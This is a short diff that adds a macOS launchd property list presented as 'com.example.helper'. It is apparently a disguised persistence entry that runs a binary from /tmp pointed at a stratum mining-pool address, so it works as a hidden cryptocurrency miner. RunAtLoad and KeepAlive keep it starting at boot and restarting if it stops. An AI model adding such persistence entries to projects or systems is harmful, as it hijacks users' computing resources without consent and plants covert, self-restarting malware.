@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<plist version="1.0"><dict>
+<key>Label</key><string>com.example.helper</string>
+<key>ProgramArguments</key><array><string>/tmp/x</string><string>-o</string><string>stratum+tcp://pool.example.invalid:3333</string></array>
+<key>RunAtLoad</key><true/>
+<key>KeepAlive</key><true/>
+</dict></plist>
